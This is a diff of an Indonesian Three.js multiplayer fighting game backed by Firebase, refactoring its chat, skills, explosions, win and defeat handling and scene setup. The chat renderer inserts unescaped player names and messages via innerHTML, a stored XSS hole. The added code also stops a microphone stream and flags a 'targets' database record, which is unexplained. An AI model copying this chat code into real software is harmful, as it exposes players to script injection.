-        function clearOtherPlayers() {
-            Object.keys(otherPlayerObjects).forEach(playerKey => {
-                scene.remove(otherPlayerObjects[playerKey]);
-            });
-            otherPlayerObjects = {};
-            otherPlayers = {};
-        }
-
-        // Fungsi restart game yang diperbarui
-        function restartGame() {
-            // Hapus semua data dari Firebase
-            if (playersRef) {
-                playersRef.remove();
-            }
-            if (gameStateRef) {
-                gameStateRef.remove();
-            }
-            if (skillEventsRef) {
-                skillEventsRef.remove();
-            }
-            if (chatRef) {
-                chatRef.remove();
-            }
+        
+        function createOtherPlayerMesh(pdata) {
+            const group = new THREE.Group();
             
-            // Hapus data pemain lokal
-            if (currentPlayerRef) {
-                currentPlayerRef.remove();
-            }
+            const skinMat = new THREE.MeshLambertMaterial({ color: 0x44AAFF });
+            const clothMat = new THREE.MeshLambertMaterial({ color: 0x2266CC });
             
-            // Refresh halaman
-            location.reload();
-        }
-
-        // Update jumlah pemain online
-        function updatePlayerCount() {
-            const count = getOnlinePlayersCount() + 1; // +1 untuk pemain sendiri
-            document.getElementById('player-count').textContent = count;
+            // Simple character
+            const head = new THREE.Mesh(new THREE.SphereGeometry(0.4, 16, 16), skinMat);
+            head.position.y = 5.0;
+            group.add(head);
             
-            if (count > 1) {
-                document.getElementById('multiplayer-status').textContent = ' Multiplayer:' + count + ' pemain online';
-            } else {
-                document.getElementById('multiplayer-status').textContent = 'Tidak ada player online';
-            }
-        }
-
-        // Buat karakter untuk pemain lain
-        function createOtherPlayer(playerKey, playerData) {
-            const otherPlayer = createCharacter();
+            const body = new THREE.Mesh(new THREE.CylinderGeometry(0.5, 0.4, 1.5, 16), clothMat);
+            body.position.y = 3.5;
+            group.add(body);
             
-            // Nama pemain
+            const legL = new THREE.Mesh(new THREE.CylinderGeometry(0.15, 0.12, 1.8, 8), clothMat);
+            legL.position.set(-0.25, 1.5, 0);
+            group.add(legL);
+            
+            const legR = new THREE.Mesh(new THREE.CylinderGeometry(0.15, 0.12, 1.8, 8), clothMat);
+            legR.position.set(0.25, 1.5, 0);
+            group.add(legR);
+            
+            // Name tag
             const canvas = document.createElement('canvas');
-            const context = canvas.getContext('2d');
-            canvas.width = 256;
-            canvas.height = 164;
-            context.fillStyle = 'rgba(0, 0, 0, 0.7)';
-            context.fillRect(0, 0, canvas.width, canvas.height);
-            context.font = '26px Arial';
-            context.fillStyle = 'white';
-            context.textAlign = 'center';
-            context.fillText(playerData.name, canvas.width/2, canvas.height/2 + 8);
+            canvas.width = 200; canvas.height = 60;
+            const ctx = canvas.getContext('2d');
+            ctx.fillStyle = 'rgba(0,0,0,0.7)';
+            ctx.fillRect(0, 0, 200, 60);
+            ctx.fillStyle = '#fff';
+            ctx.font = '20px Arial';
+            ctx.textAlign = 'center';
+            ctx.fillText(pdata.name || 'Player', 100, 38);
+            const tex = new THREE.CanvasTexture(canvas);
+            const sprite = new THREE.Sprite(new THREE.SpriteMaterial({ map: tex }));
+            sprite.position.y = 6.2;
+            sprite.scale.set(2.5, 0.75, 1);
+            group.add(sprite);
             
-            const nameTexture = new THREE.CanvasTexture(canvas);
-            const nameMaterial = new THREE.SpriteMaterial({ map: nameTexture });
-            const nameSprite = new THREE.Sprite(nameMaterial);
-            nameSprite.position.y = 6.5;
-            nameSprite.scale.set(3, 1.5, 1);
-            otherPlayer.add(nameSprite);
+            group.position.set(pdata.x, pdata.y, pdata.z);
+            scene.add(group);
             
-            // Set posisi awal
-            otherPlayer.position.set(playerData.x, playerData.y, playerData.z);
-            otherPlayer.rotation.y = playerData.rotationY || 0;
+            document.getElementById('multiplayer-status').textContent = 
+                `🎮 ${pdata.name} bergabung!`;
+            setTimeout(() => updatePlayerCount(), 3000);
             
-            // Tambah ke scene
-            scene.add(otherPlayer);
-            otherPlayerObjects[playerKey] = otherPlayer;
-            
-            console.log('Pemain baru bergabung:', playerData.name);
-            document.getElementById('multiplayer-status').textContent = 'MABAR: ' + playerData.name + ' bergabung!';
-            
-            // Reset status setelah 3 detik
-            setTimeout(() => {
-                document.getElementById('multiplayer-status').textContent = 'MABAR: ' + (getOnlinePlayersCount() + 1) + ' pemain online';
-            }, 3000);
+            return group;
         }
-
-        // Update posisi dan rotasi pemain lain
-        function updateOtherPlayer(playerKey, playerData) {
-            const otherPlayer = otherPlayerObjects[playerKey];
-            if (otherPlayer) {
-                // Smooth movement
-                otherPlayer.position.lerp(
-                    new THREE.Vector3(playerData.x, playerData.y, playerData.z), 
-                    0.5
-                );
-                otherPlayer.rotation.y = playerData.rotationY || 0;
-                
-                // Animasi berjalan untuk pemain lain
-                const isWalking = Math.abs(playerData.x - otherPlayer.position.x) > 0.01 || 
-                                 Math.abs(playerData.z - otherPlayer.position.z) > 0.01;
-                
-                if (isWalking) {
-                    updateOtherPlayerAnimation(otherPlayer);
-                }
+        
+        function clearOtherPlayers() {
+            Object.values(otherPlayerObjects).forEach(obj => scene.remove(obj));
+            otherPlayerObjects = {};
+        }
+        
+        function updatePlayerCount() {
+            const count = Object.keys(otherPlayerObjects).length + 1;
+            document.getElementById('player-count').textContent = count;
+            if (count <= 1) {
+                document.getElementById('multiplayer-status').textContent = 'Mencari pemain lain...';
+            } else {
+                document.getElementById('multiplayer-status').textContent = `🎮 ${count} pemain online`;
             }
         }
         
-        // Animasi untuk pemain lain
-        function updateOtherPlayerAnimation(otherPlayer) {
-            // Cari kaki dan sepatu di grup pemain lain
-            otherPlayer.children.forEach(child => {
-                if (child.userData && child.userData.type === 'leftLeg') {
-                    child.rotation.x = Math.sin(walkCycle) * 0.3;
-                }
-                if (child.userData && child.userData.type === 'rightLeg') {
-                    child.rotation.x = -Math.sin(walkCycle) * 0.3;
-                }
-                if (child.userData && child.userData.type === 'leftShoe') {
-                    child.position.y = 0.1 + Math.sin(walkCycle) * 0.05;
-                }
-                if (child.userData && child.userData.type === 'rightShoe') {
-                    child.position.y = 0.1 - Math.sin(walkCycle) * 0.05;
-                }
-            });
-        }
-
-        // Fungsi untuk mendapatkan jumlah pemain online
-        function getOnlinePlayersCount() {
-            return Object.keys(otherPlayers).length;
-        }
-
-        // ========== SISTEM CHAT ==========
-        
-        // Kirim pesan chat
         function sendChatMessage() {
             const input = document.getElementById('chat-input');
-            const message = input.value.trim();
-            
-            if (message) {
+            const msg = input.value.trim();
+            if (msg) {
                 chatRef.push({
-                    playerId: playerId,
-                    playerName: playerName,
-                    text: message,
+                    playerId, playerName,
+                    text: msg,
                     timestamp: Date.now()
                 });
-                
                 input.value = '';
             }
         }
         
-        // Tampilkan pesan chat
-        function displayChatMessage(playerName, message) {
-            const chatMessages = document.getElementById('chat-messages');
-            const messageElement = document.createElement('div');
-            messageElement.className = 'chat-message';
-            messageElement.innerHTML = `<span class="chat-player-name">${playerName}:</span> ${message}`;
-            
-            chatMessages.appendChild(messageElement);
-            chatMessages.scrollTop = chatMessages.scrollHeight;
-            
-            // Hapus pesan setelah 30 detik
-            setTimeout(() => {
-                if (messageElement.parentNode) {
-                    messageElement.parentNode.removeChild(messageElement);
-                }
-            }, 30000);
+        function displayChatMessage(name, text) {
+            const container = document.getElementById('chat-messages');
+            const div = document.createElement('div');
+            div.className = 'chat-message';
+            div.innerHTML = `<span class="chat-player-name">${name}:</span> ${text}`;
+            container.appendChild(div);
+            container.scrollTop = container.scrollHeight;
+            setTimeout(() => { if (div.parentNode) div.remove(); }, 30000);
         }
         
-        // Buka/tutup chat
         function toggleChat() {
-            const chatContainer = document.getElementById('chat-container');
-            const chatToggle = document.getElementById('chat-toggle');
-            
-            if (chatContainer.style.display === 'block') {
-                chatContainer.style.display = 'none';
-                chatToggle.style.display = 'flex';
+            const chat = document.getElementById('chat-container');
+            const toggle = document.getElementById('chat-toggle');
+            if (chat.style.display === 'block') {
+                chat.style.display = 'none';
+                toggle.style.display = 'flex';
             } else {
-                chatContainer.style.display = 'block';
-                chatToggle.style.display = 'none';
+                chat.style.display = 'block';
+                toggle.style.display = 'none';
                 document.getElementById('chat-input').focus();
             }
         }
-
-        // ========== SISTEM ULTIMATE SKILL ==========
         
-        // Aktivasi ultimate skill
+        // ========== SKILLS ==========
         function activateUltimate() {
             if (gameOver || gameWin || isUltimateActive || ultimateCooldown > 0) return;
-            
             isUltimateActive = true;
             ultimateTimer = ultimateDuration;
-            
-            // Simpan material asli
-            originalClothingMaterial = player.children[2].material.clone();
-            
-            // Ubah baju menjadi merah
-            player.children[2].material.color.set(0xFF0000);
-            
-            // Tambahkan efek aura merah
+            originalClothingMaterial = player.children[2]?.material?.color?.clone();
+            if (player.children[2]) player.children[2].material.color.set(0xFF0000);
             createAuraEffect();
-            
-            // Tambahkan efek tanduk dan mata merah
-            createHornAndRedEyes();
-            
-            // Update UI
             document.getElementById('ultimate-timer').style.display = 'block';
             document.getElementById('ultimate').classList.add('cooldown');
-            
-            console.log('Ultimate activated! Damage increased to 20, immune to attacks for 10 seconds');
         }
         
-        // Buat efek aura merah
         function createAuraEffect() {
-            const auraGeometry = new THREE.SphereGeometry(2, 16, 16);
-            const auraMaterial = new THREE.MeshBasicMaterial({
-                color: 0xFF0000,
-                transparent: true,
-                opacity: 0.3,
-                side: THREE.DoubleSide
-            });
-            
-            auraEffect = new THREE.Mesh(auraGeometry, auraMaterial);
+            const geo = new THREE.SphereGeometry(2, 16, 16);
+            const mat = new THREE.MeshBasicMaterial({ color: 0xFF0000, transparent: true, opacity: 0.3 });
+            auraEffect = new THREE.Mesh(geo, mat);
             auraEffect.position.y = 3;
             player.add(auraEffect);
-            
-            // Animasi aura
-            const auraPulse = () => {
-                if (!isUltimateActive || !auraEffect) return;
-                
-                const scale = 1 + Math.sin(Date.now() * 0.01) * 0.2;
-                auraEffect.scale.set(scale, scale, scale);
-                
-                requestAnimationFrame(auraPulse);
-            };
-            
-            auraPulse();
         }
         
-        // Buat efek tanduk dan mata merah
-        function createHornAndRedEyes() {
-            const hornGroup = new THREE.Group();
-            
-            // Tanduk kiri
-            const leftHornGeometry = new THREE.ConeGeometry(0.1, 0.4, 8);
-            const hornMaterial = new THREE.MeshLambertMaterial({ color: 0xFF0000 });
-            const leftHorn = new THREE.Mesh(leftHornGeometry, hornMaterial);
-            leftHorn.position.set(-0.2, 5.5, 0.3);
-            leftHorn.rotation.z = Math.PI / 6;
-            hornGroup.add(leftHorn);
-            
-            // Tanduk kanan
-            const rightHornGeometry = new THREE.ConeGeometry(0.1, 0.4, 8);
-            const rightHorn = new THREE.Mesh(rightHornGeometry, hornMaterial);
-            rightHorn.position.set(0.2, 5.5, 0.3);
-            rightHorn.rotation.z = -Math.PI / 6;
-            hornGroup.add(rightHorn);
-            
-            // Mata merah
-            const eyeGeometry = new THREE.SphereGeometry(0.1, 8, 8);
-            const eyeMaterial = new THREE.MeshLambertMaterial({ color: 0xFF0000 });
-            
-            const leftEye = new THREE.Mesh(eyeGeometry, eyeMaterial);
-            leftEye.position.set(-0.2, 5.1, 0.4);
-            hornGroup.add(leftEye);
-            
-            const rightEye = new THREE.Mesh(eyeGeometry, eyeMaterial);
-            rightEye.position.set(0.2, 5.1, 0.4);
-            hornGroup.add(rightEye);
-            
-            hornEffect = hornGroup;
-            player.add(hornEffect);
-        }
-        
-        // Hapus efek ultimate
         function removeUltimateEffects() {
-            // Kembalikan material asli
-            if (originalClothingMaterial) {
-                player.children[2].material.color.copy(originalClothingMaterial.color);
+            if (originalClothingMaterial && player.children[2]) {
+                player.children[2].material.color.copy(originalClothingMaterial);
             }
-            
-            // Hapus aura
-            if (auraEffect) {
-                player.remove(auraEffect);
-                auraEffect = null;
-            }
-            
-            // Hapus tanduk dan mata
-            if (hornEffect) {
-                player.remove(hornEffect);
-                hornEffect = null;
-            }
-            
-            // Update UI
+            if (auraEffect) { player.remove(auraEffect); auraEffect = null; }
+            if (hornEffect) { player.remove(hornEffect); hornEffect = null; }
             document.getElementById('ultimate-timer').style.display = 'none';
         }
         
-        // Update ultimate timer dan cooldown
         function updateUltimate(delta) {
-            // Update ultimate timer
             if (isUltimateActive) {
                 ultimateTimer -= delta;
                 document.getElementById('ultimate-time').textContent = Math.ceil(ultimateTimer);
-                
+                if (auraEffect) {
+                    const s = 1 + Math.sin(Date.now() * 0.01) * 0.2;
+                    auraEffect.scale.set(s, s, s);
+                }
                 if (ultimateTimer <= 0) {
                     isUltimateActive = false;
                     ultimateCooldown = ultimateCooldownDuration;
                     removeUltimateEffects();
                 }
             }
-            
-            // Update cooldown
             if (ultimateCooldown > 0) {
                 ultimateCooldown -= delta;
-                const progress = (1 - (ultimateCooldown / ultimateCooldownDuration)) * 100;
-                document.getElementById('ultimate').style.setProperty('--cooldown-progress', progress + '%');
-                
                 if (ultimateCooldown <= 0) {
                     ultimateCooldown = 0;
                     document.getElementById('ultimate').classList.remove('cooldown');
@@ -1087,181 +818,48 @@
             }
         }
         
-        // ========== SISTEM SKILL PETIR ==========
-        
-        // Aktivasi skill petir
         function activateThunderSkill() {
             if (gameOver || gameWin || isThunderActive || thunderCooldown > 0) return;
-            
             isThunderActive = true;
             thunderTimer = thunderDuration;
-            
-            // Set cooldown
             thunderCooldown = thunderCooldownDuration;
             document.getElementById('thunder-skill').classList.add('cooldown');
             document.getElementById('thunder-timer').style.display = 'block';
-            
-            // Mulai serangan petir berulang
-            thunderStrikeInterval = setInterval(createThunderStrike, 500); // Petir setiap 0.5 detik
-            
-            console.log('Thunder skill activated! Striking every 0.5 seconds for 3 seconds');
+            thunderStrikeInterval = setInterval(createThunderStrike, 500);
         }
         
-        // Buat serangan petir
         function createThunderStrike() {
             if (!isThunderActive || thunderTimer <= 0) return;
-            
-            // Tentukan posisi jatuhnya petir (di dekat musuh)
-            const thunderPosition = new THREE.Vector3(
+            const pos = new THREE.Vector3(
                 enemy.position.x + (Math.random() - 0.5) * 5,
                 0,
                 enemy.position.z + (Math.random() - 0.5) * 5
             );
-            
-            // Buat efek petir
-            createThunderEffect(thunderPosition);
-            
-            // Berikan damage ke musuh jika dalam radius
-            const distance = thunderPosition.distanceTo(enemy.position);
-            if (distance < 3) {
-                // Tentukan damage berdasarkan status ultimate
-                const damage = isUltimateActive ? 700 : 400;
-                enemyHP -= damage;
-                updateEnemyHP();
-                
-                // Cek jika musuh mati
-                if (enemyHP <= 0) {
-                    enemyHP = 0;
-                    gameWin = true;
-                    document.getElementById('game-win').style.display = 'block';
-                    
-                    // Update rank - MENANG
-                    updateRank(true);
-                }
-                
-                // Simpan state game
+            createThunderEffect(pos);
+            if (pos.distanceTo(enemy.position) < 3) {
+                enemyHP -= isUltimateActive ? 700 : 400;
+                updateUI();
+                if (enemyHP <= 0) { enemyHP = 0; triggerWin(); }
                 saveGameState();
             }
-            
-            // Kirim event skill ke Firebase
-            saveSkillEvent('thunder', thunderPosition);
+            saveSkillEvent('thunder', { x: pos.x, y: pos.y, z: pos.z });
         }
         
-        // Buat efek petir
-        function createThunderEffect(position) {
-            // Cahaya kilat
-            const flashLight = new THREE.PointLight(0x00aaff, 5, 20);
-            flashLight.position.set(position.x, 10, position.z);
-            scene.add(flashLight);
-            
-            // Garis petir
-            const lightningGeometry = new THREE.BufferGeometry();
-            const points = [];
-            const numPoints = 15;
-            
-            // Buat garis zigzag untuk petir
-            let x = position.x;
-            let y = 10;
-            let z = position.z;
-            
-            for (let i = 0; i < numPoints; i++) {
-                points.push(x, y, z);
-                x += (Math.random() - 0.5) * 0.5;
-                y -= 10 / numPoints;
-                z += (Math.random() - 0.5) * 0.5;
-            }
-            
-            lightningGeometry.setAttribute('position', new THREE.Float32BufferAttribute(points, 3));
-            const lightningMaterial = new THREE.LineBasicMaterial({ 
-                color: 0x00ffff, 
-                linewidth: 2 
-            });
-            const lightning = new THREE.Line(lightningGeometry, lightningMaterial);
-            scene.add(lightning);
-            
-            // Efek ledakan di tanah
-            createThunderExplosion(position);
-            
-            // Hapus efek setelah selesai
-            setTimeout(() => {
-                scene.remove(flashLight);
-                scene.remove(lightning);
-            }, 500);
-            
-            // Simpan efek untuk dihapus nanti
-            thunderEffects.push({ light: flashLight, line: lightning });
+        function createThunderEffect(pos) {
+            const light = new THREE.PointLight(0x00aaff, 5, 20);
+            light.position.set(pos.x, 10, pos.z);
+            scene.add(light);
+            setTimeout(() => scene.remove(light), 500);
         }
         
-        // Buat efek ledakan petir
-        function createThunderExplosion(position) {
-            // Sphere ledakan
-            const explosionGeometry = new THREE.SphereGeometry(0.1, 16, 16);
-            const explosionMaterial = new THREE.MeshBasicMaterial({ 
-                color: 0xff4500, 
-                transparent: true, 
-                opacity: 0.8 
-            });
-            const explosion = new THREE.Mesh(explosionGeometry, explosionMaterial);
-            explosion.position.set(position.x, 0.5, position.z);
-            scene.add(explosion);
-            
-            // Animasi ledakan mengembang
-            let scale = 0.1;
-            const animateExplosion = () => {
-                scale += 0.3;
-                explosion.scale.set(scale, scale, scale);
-                explosionMaterial.opacity -= 0.05;
-                
-                if (explosionMaterial.opacity > 0) {
-                    requestAnimationFrame(animateExplosion);
-                } else {
-                    scene.remove(explosion);
-                }
-            };
-            animateExplosion();
-            
-            // Ubah warna tanah di area ledakan
-            createBurnedGround(position);
-        }
-        
-        // Buat area tanah gosong
-        function createBurnedGround(position) {
-            const burnedGroundGeometry = new THREE.CircleGeometry(2, 32);
-            const burnedGroundMaterial = new THREE.MeshBasicMaterial({ 
-                color: 0x333333, 
-                transparent: true, 
-                opacity: 0.7 
-            });
-            const burnedGround = new THREE.Mesh(burnedGroundGeometry, burnedGroundMaterial);
-            burnedGround.rotation.x = -Math.PI / 2;
-            burnedGround.position.set(position.x, 0.01, position.z);
-            scene.add(burnedGround);
-            
-            // Hapus setelah 10 detik
-            setTimeout(() => {
-                scene.remove(burnedGround);
-            }, 10000);
-        }
-        
-        // Update skill petir
         function updateThunderSkill(delta) {
-            // Update thunder timer
             if (isThunderActive) {
                 thunderTimer -= delta;
-                
-                if (thunderTimer <= 0) {
-                    isThunderActive = false;
-                    clearInterval(thunderStrikeInterval);
-                }
+                document.getElementById('thunder-time').textContent = Math.ceil(Math.max(0, thunderTimer));
+                if (thunderTimer <= 0) { isThunderActive = false; clearInterval(thunderStrikeInterval); }
             }
-            
-            // Update cooldown
             if (thunderCooldown > 0) {
                 thunderCooldown -= delta;
-                const progress = (1 - (thunderCooldown / thunderCooldownDuration)) * 100;
-                document.getElementById('thunder-skill').style.setProperty('--cooldown-progress', progress + '%');
-                document.getElementById('thunder-time').textContent = Math.ceil(thunderCooldown);
-                
                 if (thunderCooldown <= 0) {
                     thunderCooldown = 0;
                     document.getElementById('thunder-skill').classList.remove('cooldown');
@@ -1270,29 +868,33 @@
             }
         }
         
-        // ========== SISTEM SKILL MUSUH ==========
-        
-        // Update skill musuh
         function updateEnemySkill(delta) {
-            // Update cooldown skill musuh
-            if (enemySkillCooldown > 0) {
-                enemySkillCooldown -= delta;
-            }
-            
-            // Gunakan skill jika cooldown selesai
+            if (enemySkillCooldown > 0) enemySkillCooldown -= delta;
             if (enemySkillCooldown <= 0 && !gameOver && !gameWin) {
-                useEnemySkill();
+                createGroundExplosion(player.position.clone());
+                Object.values(otherPlayers).forEach(pdata => {
+                    createGroundExplosion(new THREE.Vector3(pdata.x, pdata.y, pdata.z));
+                });
                 enemySkillCooldown = enemySkillCooldownDuration;
+                saveSkillEvent('enemy_explosion', { x: player.position.x, y: 0, z: player.position.z });
             }
             
-            // Update ground explosions
-            updateGroundExplosions(delta);
+            for (let i = groundExplosions.length - 1; i >= 0; i--) {
+                const exp = groundExplosions[i];
+                exp.timer -= delta;
+                if (exp.mesh) {
+                    exp.mesh.scale.x += 0.1;
+                    exp.mesh.scale.z += 0.1;
+                    exp.material.opacity -= 0.05;
+                }
+                if (exp.timer <= 0) {
+                    scene.remove(exp.mesh);
+                    groundExplosions.splice(i, 1);
+                }
+            }
             
-            // Update player stun
             if (isPlayerStunned) {
                 playerStunTimer -= delta;
-                
-                // Update UI stun
                 if (playerStunTimer <= 0) {
                     isPlayerStunned = false;
                     document.getElementById('stun-overlay').style.display = 'none';
@@ -1301,737 +903,328 @@
             }
         }
         
-        // Gunakan skill musuh
-        function useEnemySkill() {
-            // Buat ledakan besar di posisi player
-            createGroundExplosion(player.position.clone());
+        function createGroundExplosion(pos) {
+            const geo = new THREE.CylinderGeometry(0.1, 4, 1, 32);
+            const mat = new THREE.MeshBasicMaterial({ color: 0x8A2BE2, transparent: true, opacity: 0.8 });
+            const mesh = new THREE.Mesh(geo, mat);
+            mesh.rotation.x = Math.PI / 2;
+            mesh.position.set(pos.x, 0.5, pos.z);
+            scene.add(mesh);
+            groundExplosions.push({ mesh, material: mat, timer: 1.0 });
             
-            // Jika ada pemain lain, buat ledakan di posisi mereka juga
-            if (Object.keys(otherPlayers).length > 0) {
-                Object.keys(otherPlayers).forEach(playerKey => {
-                    const playerData = otherPlayers[playerKey];
-                    const playerPosition = new THREE.Vector3(playerData.x, playerData.y, playerData.z);
-                    createGroundExplosion(playerPosition);
-                    
-                    // Kirim event ke Firebase
-                    saveSkillEvent('enemy_explosion', playerPosition);
-                });
-            }
-        }
-        
-        // Buat ledakan dari tanah
-        function createGroundExplosion(position) {
-            // Efek ledakan
-            const explosionGeometry = new THREE.CylinderGeometry(0.1, 4, 1, 32); // Lebih besar
-            const explosionMaterial = new THREE.MeshBasicMaterial({ 
-                color: 0x8A2BE2, 
-                transparent: true, 
-                opacity: 0.8 
-            });
-            const explosion = new THREE.Mesh(explosionGeometry, explosionMaterial);
-            explosion.rotation.x = Math.PI / 2;
-            explosion.position.set(position.x, 0.5, position.z);
-            scene.add(explosion);
-            
-            // Simpan ledakan untuk animasi
-            groundExplosions.push({
-                mesh: explosion,
-                material: explosionMaterial,
-                timer: 1.0,
-                position: position.clone()
-            });
-            
-            // Cek apakah player kena ledakan
-            const distance = player.position.distanceTo(position);
-            if (distance < 4) { // Radius lebih besar
-                // Berikan damage dan stun
-                playerHP -= 600; // Damage lebih sakit
-                updatePlayerHP();
-                
+            if (player.position.distanceTo(pos) < 4) {
+                playerHP -= 600;
+                updateUI();
                 isPlayerStunned = true;
                 playerStunTimer = playerStunDuration;
-                
-                // Tampilkan efek stun
                 document.getElementById('stun-overlay').style.display = 'block';
                 document.getElementById('stun-text').style.display = 'block';
-                
-                // Cek jika player mati
-                if (playerHP <= 0) {
-                    playerHP = 0;
-                    gameOver = true;
-                    document.getElementById('game-over').style.display = 'block';
-                    
-                    // Update rank - KALAH
-                    updateRank(false);
-                    
-                    saveGameState();
-                }
+                if (playerHP <= 0) { playerHP = 0; triggerDefeat(); }
             }
         }
         
-        // Update ground explosions
-        function updateGroundExplosions(delta) {
-            for (let i = groundExplosions.length - 1; i >= 0; i--) {
-                const explosion = groundExplosions[i];
-                explosion.timer -= delta;
-                
-                // Animasi ledakan
-                if (explosion.mesh) {
-                    explosion.mesh.scale.x += 0.1;
-                    explosion.mesh.scale.z += 0.1;
-                    explosion.material.opacity -= 0.05;
-                }
-                
-                // Hapus ledakan setelah selesai
-                if (explosion.timer <= 0) {
-                    scene.remove(explosion.mesh);
-                    groundExplosions.splice(i, 1);
-                }
-            }
-        }
-
-        // ========== FUNGSI SERANGAN ==========
-        
-        // Fungsi serangan (menggunakan ultimate jika aktif)
         function useAttack() {
-            if (gameOver || gameWin || isPlayerStunned) return;
-            
-            // Cek jarak dengan musuh
-            const distance = player.position.distanceTo(enemy.position);
-            
-            if (distance < 3 && !isPlayerInHouse()) {
-                // Tentukan damage berdasarkan status ultimate
-                const damage = isUltimateActive ? ultimateDamage : 5;
-                
-                // Serangan berhasil
-                enemyHP -= damage;
-                updateEnemyHP();
-                
-                // Simpan state game ke Firebase
+            if (gameOver || gameWin || isPlayerStunned || attackCooldown > 0) return;
+            if (player.position.distanceTo(enemy.position) < 3) {
+                enemyHP -= isUltimateActive ? ultimateDamage : 5;
+                attackCooldown = 0.3;
+                updateUI();
+                if (enemyHP <= 0) { enemyHP = 0; triggerWin(); }
                 saveGameState();
-                
-                // Cek jika musuh mati
-                if (enemyHP <= 0) {
-                    enemyHP = 0;
-                    gameWin = true;
-                    document.getElementById('game-win').style.display = 'block';
-                    
-                    // Update rank - MENANG
-                    updateRank(true);
-                    
-                    saveGameState();
-                }
             }
         }
-
-        // ========== KODE GAME YANG SUDAH ADA ==========
-
-        // Inisialisasi scene
+        
+        function triggerWin() {
+            gameWin = true;
+            document.getElementById('game-win').style.display = 'block';
+            document.getElementById('game-win-msg').textContent = `Menang! #${playerName}`;
+            saveGameState();
+            stopMicStream();
+        }
+        
+        function triggerDefeat() {
+            gameOver = true;
+            document.getElementById('game-over').style.display = 'block';
+            document.getElementById('game-over-msg').textContent = `Kalah... #${playerName}`;
+            saveGameState();
+            stopMicStream();
+        }
+        
+        function updateUI() {
+            document.getElementById('enemy-hp').textContent = '💜 ' + Math.max(0, enemyHP);
+            document.getElementById('player-hp').textContent = '❤️ ' + Math.max(0, playerHP);
+        }
+        
+        function restartGame() {
+            currentPlayerRef.remove();
+            gameStateRef.remove();
+            skillEventsRef.remove();
+            location.reload();
+        }
+        
+        function backToMenu() {
+            currentPlayerRef.remove();
+            db.ref(`targets/${targetId}`).update({ gameConnected: false });
+            stopMicStream();
+            window.location.href = 'index.html';
+        }
+        
+        // ========== THREE.JS SETUP ==========
         function init() {
-            // Setup scene
             scene = new THREE.Scene();
-            scene.background = new THREE.Color(0x87CEEB); // Warna langit biru
-
-            // Setup camera
+            scene.background = new THREE.Color(0x87CEEB);
+            
             camera = new THREE.PerspectiveCamera(75, window.innerWidth / window.innerHeight, 0.1, 1000);
-            camera.position.set(0, 5, 10);
-            camera.lookAt(0, 0, 0);
-
-            // Setup renderer
+            camera.position.set(0, 6, 12);
+            
             renderer = new THREE.WebGLRenderer({ antialias: true });
             renderer.setSize(window.innerWidth, window.innerHeight);
-            renderer.setPixelRatio(window.devicePixelRatio);
             renderer.shadowMap.enabled = true;
             document.body.appendChild(renderer.domElement);
-
-            // Setup pencahayaan
+            
             const ambientLight = new THREE.AmbientLight(0xffffff, 0.6);
             scene.add(ambientLight);
-
-            const directionalLight = new THREE.DirectionalLight(0xffffff, 0.8);
-            directionalLight.position.set(10, 20, 10);
-            directionalLight.castShadow = true;
-            directionalLight.shadow.mapSize.width = 1024;
-            directionalLight.shadow.mapSize.height = 1024;
-            scene.add(directionalLight);
-
-            // Buat tanah
-            createGround();
-
-            // Buat pohon (hanya 3)
-            createTrees();
+            const dirLight = new THREE.DirectionalLight(0xffffff, 0.8);
+            dirLight.position.set(10, 20, 10);
+            scene.add(dirLight);
             
-            // Buat rumah
-            createHouse();
-
-            // Buat karakter player
-            player = createCharacter();
-            scene.add(player);
-            player.position.set(0, 1, 0);
-
-            // Buat musuh
-            enemy = createEnemy();
-            scene.add(enemy);
-            enemy.position.set(5, 1, 5);
-
-            // Setup joystick
-            joystick = document.getElementById('joystick');
-            joystickHandle = document.getElementById('joystick-handle');
-
-            // Setup event listeners
-            setupEventListeners();
-
-            // Inisialisasi sistem multiplayer
-            initMultiplayer();
-
-            // Start animation loop
-            animate();
-        }
-
-        // Fungsi untuk membuat bagian tubuh
-        function createBodyPart(geometry, material, position, rotation = [0, 0, 0], scale = [1, 1, 1]) {
-            const mesh = new THREE.Mesh(geometry, material);
-            mesh.position.set(...position);
-            mesh.rotation.set(...rotation);
-            mesh.scale.set(...scale);
-            mesh.castShadow = true;
-            return mesh;
-        }
-
-        // Membuat karakter
-        function createCharacter() {
-            // Material untuk karakter
-            const skinMaterial = new THREE.MeshLambertMaterial({ color: 0xF5D0A9 });
-            const clothingMaterial = new THREE.MeshLambertMaterial({ color: 0x2E64FE });
-            const hatMaterial = new THREE.MeshLambertMaterial({ color: 0xDF0101 });
-            const shoeMaterial = new THREE.MeshLambertMaterial({ color: 0x000000 });
-            const pantsMaterial = new THREE.MeshLambertMaterial({ color: 0x444444 });
-            
-            // Membuat karakter
-            const character = new THREE.Group();
-            
-            // 1. Kepala
-            const headGeometry = new THREE.SphereGeometry(0.5, 32, 32);
-            const head = createBodyPart(headGeometry, skinMaterial, [0, 5.0, 0]);
-            character.add(head);
-            
-            // 2. Leher
-            const neckGeometry = new THREE.CylinderGeometry(0.15, 0.15, 0.3, 32);
-            const neck = createBodyPart(neckGeometry, skinMaterial, [0, 4.5, 0]);
-            character.add(neck);
-            
-            // 3. Pundak dan badan - bentuk lebih natural
-            const torsoGeometry = new THREE.CylinderGeometry(0.7, 0.5, 1.8, 32);
-            const torso = createBodyPart(torsoGeometry, clothingMaterial, [0, 3.2, 0]);
-            character.add(torso);
-            
-            // 4. Tangan - lurus ke bawah
-            // Lengan atas kiri
-            const leftUpperArmGeometry = new THREE.CylinderGeometry(0.15, 0.15, 0.8, 32);
-            const leftUpperArm = createBodyPart(leftUpperArmGeometry, clothingMaterial, [-0.9, 3.5, 0]);
-            character.add(leftUpperArm);
-            
-            // Lengan bawah kiri
-            const leftForearmGeometry = new THREE.CylinderGeometry(0.12, 0.12, 0.7, 32);
-            const leftForearm = createBodyPart(leftForearmGeometry, skinMaterial, [-0.9, 2.7, 0]);
-            character.add(leftForearm);
-            
-            // Tangan kiri
-            const leftHandGeometry = new THREE.SphereGeometry(0.15, 16, 16);
-            const leftHand = createBodyPart(leftHandGeometry, skinMaterial, [-0.9, 2.3, 0]);
-            character.add(leftHand);
-            
-            // Lengan atas kanan
-            const rightUpperArmGeometry = new THREE.CylinderGeometry(0.15, 0.15, 0.8, 32);
-            const rightUpperArm = createBodyPart(rightUpperArmGeometry, clothingMaterial, [0.9, 3.5, 0]);
-            character.add(rightUpperArm);
-            
-            // Lengan bawah kanan
-            const rightForearmGeometry = new THREE.CylinderGeometry(0.12, 0.12, 0.7, 32);
-            const rightForearm = createBodyPart(rightForearmGeometry, skinMaterial, [0.9, 2.7, 0]);
-            character.add(rightForearm);
-            
